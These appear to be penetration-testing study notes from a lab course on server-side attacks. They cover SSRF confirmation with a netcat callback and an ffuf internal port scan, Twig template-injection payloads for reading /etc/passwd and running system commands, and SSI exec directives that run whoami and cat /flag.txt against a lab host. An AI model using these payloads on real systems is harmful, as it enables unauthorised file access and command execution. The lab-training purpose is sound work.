# Identifying SSRF

## Confirming SSRF

```http
POST /index.php HTTP/1.1
Host: 10.129.201.127
Content-Length: 65
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.129.201.127
Referer: http://10.129.201.127/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

dateserver=http://dateserver.htb/availability.php&date=2024-01-01
```

As we can see, the request contains our a URL in the parameter `dateserver`, which indicates that the web server retrieves the availability information from a separate system, as specified by the URL passed in this POST parameter.

To confirm an SSRF vulnerability, let us supply a URL pointing to our system to the web application:

```http
POST /index.php HTTP/1.1
Host: 10.129.201.127
Content-Length: 65
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.129.201.127
Referer: http://10.129.201.127/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

dateserver=http://10.10.16.50:4444/&date=2024-01-01
```

In a `netcat` listener, we can receive a connection, thus confirming SSRF:

```bash
 󰛓 ❯ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.201.127 52520
GET / HTTP/1.1
Host: 10.10.16.50:4444
Accept: */*
```

## Port Scan using SSRF

```bash
❯ ffuf -u 'http://10.129.201.127/index.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'dateserver=http://dateserver.htb:FUZZ/&date=2024-01-01' -w ports.txt -ic -c -fr 'Failed'
```


# Exploiting SSTI - Twig

```twig
{{ _self }}
```

## Local File Inclusion

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

## Remote Code Execution

```twig
{{ ['id'] | filter('system') }}
```

There are also SSTI cheat sheets that bundle payloads for popular template engines, such as the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md).

# Exploiting SSI Injection

Server-Side Includes (SSI) is a technology that web applications use to create dynamic content on HTML pages. SSI is supported by many popular web servers such as [Apache](https://httpd.apache.org/docs/current/howto/ssi.html) and [IIS](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude). The use of SSI can often be inferred from the file extension. Typical file extensions include `.shtml`, `.shtm`, and `.stm`.

## SSI Directives

SSI utilizes `directives` to add dynamically generated content to a static HTML page. These directives consist of the following components:

- `name`: the directive's name
- `parameter name`: one or more parameters
- `value`: one or more parameter values

An SSI directive has the following syntax:

```ssi
<!--#name param1="value1" param2="value" -->
```

## printenv

```ssi
<!--#printenv -->
```

## config 

```ssi
<!--#config errmsg="Error!" -->
```

## echo

```ssi
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```

## exec

```ssi
<!--#exec cmd="whoami" -->

<!--#exec cmd="cat /flag.txt" -->
```

## include

```ssi
<!--#include virtual="index.html" -->
```

